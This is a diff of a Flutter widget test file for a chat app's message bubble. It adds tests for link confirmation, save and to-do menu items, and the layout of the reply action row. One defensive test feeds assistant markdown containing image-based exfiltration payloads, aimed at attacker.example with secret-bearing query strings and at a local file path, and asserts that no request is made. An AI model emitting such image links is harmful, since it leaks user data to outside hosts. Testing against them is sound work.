@@ -32,6 +32,35 @@ class _FakeUrlLauncher extends UrlLauncherPlatform {
   }
 }
 
+/// Records every URL any HttpClient is asked to open; fails the connection.
+class _CountingHttpOverrides {
+  final List<Uri> requests = [];
+  HttpClient create(SecurityContext? c) => _CountingClient(requests);
+}
+
+class _CountingClient implements HttpClient {
+  _CountingClient(this.requests);
+  final List<Uri> requests;
+
+  @override
+  Future<HttpClientRequest> getUrl(Uri url) {
+    requests.add(url);
+    throw const SocketException('blocked by test');
+  }
+
+  @override
+  Future<HttpClientRequest> openUrl(String method, Uri url) {
+    requests.add(url);
+    throw const SocketException('blocked by test');
+  }
+
+  @override
+  dynamic noSuchMethod(Invocation invocation) {
+    requests.add(Uri.parse('unknown:${invocation.memberName}'));
+    throw const SocketException('blocked by test');
+  }
+}
+
 MessageInfo _message({
   required MessageRole role,
   required String content,
@@ -62,6 +91,12 @@ Future<void> _pump(WidgetTester tester, Widget child) {
       ),
     ),
   );
+}
+
+/// Opens the reply row's overflow menu.
+Future<void> _openMore(WidgetTester tester) async {
+  await tester.tap(find.byKey(const ValueKey('reply-more')));
+  await tester.pumpAndSettle();
 }
 
 void main() {
@@ -122,11 +157,44 @@ void main() {
       await tester.pump();
       expect(find.byIcon(Icons.check), findsOneWidget);
       expect(find.byTooltip('Copied'), findsOneWidget);
-      // Let the copy-icon's revert timer (motion.moderate, 300ms) run out so
+      // Let the copy-icon's revert timer (1200ms) run out so
       // no pending timer trips flutter_test's end-of-test invariant check.
-      await tester.pump(const Duration(milliseconds: 350));
+      await tester.pump(const Duration(milliseconds: 1250));
     },
   );
+
+  group('F1: model markdown never fetches', () {
+    testWidgets('a markdown image performs zero HTTP requests', (tester) async {
+      final overrides = _CountingHttpOverrides();
+      await HttpOverrides.runZoned(() async {
+        await _pump(
+          tester,
+          MessageBubble(
+            message: _message(
+              role: MessageRole.assistant,
+              content:
+                  'Here you go ![](https://attacker.example/p.png?d=secret) '
+                  'and ![x](http://attacker.example/a.png?d=more)\n\n'
+                  '![](file:///data/user/0/x/secret.png)',
+            ),
+          ),
+        );
+        await tester.pumpAndSettle();
+        await tester.runAsync(
+          () => Future<void>.delayed(const Duration(milliseconds: 50)),
+        );
+        await tester.pumpAndSettle();
+      }, createHttpClient: overrides.create);
+
+      expect(overrides.requests, isEmpty);
+      expect(find.byType(Image), findsNothing);
+      expect(
+        find.byKey(const ValueKey('markdown-image-placeholder')),
+        findsNWidgets(3),
+      );
+      expect(find.text('Image not loaded'), findsNWidgets(3));
+    });
+  });
 
   group('N4 (staff review): markdown links', () {
     late _FakeUrlLauncher fakeLauncher;
@@ -141,9 +209,34 @@ void main() {
       UrlLauncherPlatform.instance = realLauncher;
     });
 
-    testWidgets('tapping a markdown link launches its href externally', (
-      tester,
-    ) async {
+    testWidgets(
+      'a link tap asks first, shows the full URL, opens only on Open',
+      (tester) async {
+        await _pump(
+          tester,
+          MessageBubble(
+            message: _message(
+              role: MessageRole.assistant,
+              content: '[the docs](https://example.com/docs)',
+            ),
+          ),
+        );
+        await tester.pumpAndSettle();
+
+        await tester.tap(find.text('the docs'));
+        await tester.pumpAndSettle();
+
+        // Nothing opened yet: the sheet shows the full address.
+        expect(fakeLauncher.launched, isEmpty);
+        expect(find.text('https://example.com/docs'), findsOneWidget);
+
+        await tester.tap(find.byKey(const ValueKey('link-confirm-open')));
+        await tester.pumpAndSettle();
+        expect(fakeLauncher.launched, ['https://example.com/docs']);
+      },
+    );
+
+    testWidgets('Cancel on the link sheet opens nothing', (tester) async {
       await _pump(
         tester,
         MessageBubble(
@@ -154,11 +247,12 @@ void main() {
         ),
       );
       await tester.pumpAndSettle();
-
       await tester.tap(find.text('the docs'));
       await tester.pumpAndSettle();
-
-      expect(fakeLauncher.launched, ['https://example.com/docs']);
+      await tester.tap(find.byKey(const ValueKey('link-confirm-cancel')));
+      await tester.pumpAndSettle();
+      expect(fakeLauncher.launched, isEmpty);
+      expect(find.byKey(const ValueKey('link-confirm-url')), findsNothing);
     });
 
     testWidgets('a non-http(s) href (trust-boundary case) is never launched', (
@@ -282,7 +376,7 @@ void main() {
         await tester.pumpAndSettle();
 
         expect(find.byType(Image), findsOneWidget);
-        expect(find.byType(Dialog), findsNothing);
+        expect(find.byType(InteractiveViewer), findsNothing);
         // Designer BLOCKING: the tap-to-view thumbnail carries a "View image"
         // tooltip + button semantics (was a bare, unlabeled GestureDetector).
         expect(find.byTooltip('View image'), findsOneWidget);
@@ -299,12 +393,12 @@ void main() {
             .onTap!();
         await tester.pumpAndSettle();
 
-        expect(find.byType(Dialog), findsOneWidget);
+        expect(find.byType(InteractiveViewer), findsOneWidget);
         expect(find.byType(InteractiveViewer), findsOneWidget);
 
         await tester.tap(find.byTooltip('Close'));
         await tester.pumpAndSettle();
-        expect(find.byType(Dialog), findsNothing);
+        expect(find.byType(InteractiveViewer), findsNothing);
       },
     );
 
@@ -330,7 +424,7 @@ void main() {
         expect(find.byIcon(Icons.check), findsOneWidget);
         // Revert timer — drain it so no pending timer trips flutter_test's
         // end-of-test invariant check.
-        await tester.pump(const Duration(milliseconds: 950));
+        await tester.pump(const Duration(milliseconds: 1250));
       },
     );
 
@@ -393,6 +487,122 @@ void main() {
         await tester.pump();
         expect(find.textContaining('Sources'), findsNothing);
       });
+    });
+  });
+
+  group('Wave 3B: Save and Add to to-dos', () {
+    testWidgets('Save keeps the reply, then shows it as saved', (tester) async {
+      var saved = 0;
+      await _pump(
+        tester,
+        MessageBubble(
+          message: _message(role: MessageRole.assistant, content: 'A reply'),
+          onSave: () async => saved++,
+        ),
+      );
+      await tester.pumpAndSettle();
+      // Save lives in the overflow menu, not as a fourth icon in the row.
+      expect(find.byKey(const ValueKey('save-reply')), findsNothing);
+      await _openMore(tester);
+      expect(find.text('Save to Library'), findsOneWidget);
+      await tester.tap(find.byKey(const ValueKey('save-reply')));
+      await tester.pumpAndSettle();
+      expect(saved, 1);
+      await _openMore(tester);
+      expect(find.text('Saved to Library'), findsOneWidget);
+      // A second tap does nothing (the item is disabled).
+      await tester.tap(find.byKey(const ValueKey('save-reply')));
+      await tester.pumpAndSettle();
+      expect(saved, 1);
+    });
+
+    testWidgets('no Save without a handler; no to-do button without tasks', (
+      tester,
+    ) async {
+      await _pump(
+        tester,
+        MessageBubble(
+          message: _message(role: MessageRole.assistant, content: 'A reply'),
+          onAddTodos: () async {},
+        ),
+      );
+      await tester.pumpAndSettle();
+      await _openMore(tester);
+      expect(find.byKey(const ValueKey('save-reply')), findsNothing);
+      expect(find.byKey(const ValueKey('add-todos')), findsNothing);
+    });
+
+    testWidgets('the to-do button names how many tasks it adds', (
+      tester,
+    ) async {
+      var added = 0;
+      await _pump(
+        tester,
+        MessageBubble(
+          message: _message(
+            role: MessageRole.assistant,
+            content: '- [ ] a\n- [ ] b',
+          ),
+          todoCount: 2,
+          onAddTodos: () async => added++,
+        ),
+      );
+      await tester.pumpAndSettle();
+      await _openMore(tester);
+      expect(find.text('Add 2 to your to-dos'), findsOneWidget);
+      await tester.tap(find.byKey(const ValueKey('add-todos')));
+      await tester.pumpAndSettle();
+      expect(added, 1);
+      await _openMore(tester);
+      expect(find.text('Added to to-dos'), findsOneWidget);
+    });
+  });
+
+  group('reply action row', () {
+    testWidgets('Copy and Regenerate are visible; the rest is in a menu, on '
+        'one line', (tester) async {
+      await tester.binding.setSurfaceSize(const Size(360, 800));
+      addTearDown(() => tester.binding.setSurfaceSize(null));
+      await _pump(
+        tester,
+        MessageBubble(
+          message: MessageInfo(
+            id: 1,
+            conversationId: 1,
+            role: MessageRole.assistant,
+            content: 'A reply',
+            status: MessageStatus.complete,
+            createdAt: DateTime.now().subtract(const Duration(minutes: 12)),
+            tokCount: 120,
+            genMs: 9000,
+          ),
+          onRegenerate: () {},
+          onReport: () {},
+          onSave: () async {},
+          todoCount: 2,
+          onAddTodos: () async {},
+        ),
+      );
+      await tester.pumpAndSettle();
+      expect(find.byTooltip('Copy text'), findsOneWidget);
+      expect(find.byTooltip('Regenerate response'), findsOneWidget);
+      // Speaker, save, to-dos and report are not icons in the row.
+      expect(find.byTooltip('Read aloud'), findsNothing);
+      expect(find.byTooltip('Report this reply'), findsNothing);
+      expect(find.byIcon(Icons.flag_outlined), findsNothing);
+      // One line: copy, regenerate and the menu share the text's baseline row.
+      final copy = tester.getCenter(find.byTooltip('Copy text')).dy;
+      expect(tester.getCenter(find.byTooltip('Regenerate response')).dy, copy);
+      expect(
+        tester.getCenter(find.byKey(const ValueKey('reply-more'))).dy,
+        copy,
+      );
+
+      await _openMore(tester);
+      expect(find.text('Read aloud'), findsOneWidget);
+      expect(find.text('Save to Library'), findsOneWidget);
+      expect(find.text('Add 2 to your to-dos'), findsOneWidget);
+      expect(find.text('Report this reply'), findsOneWidget);
     });
   });
 }
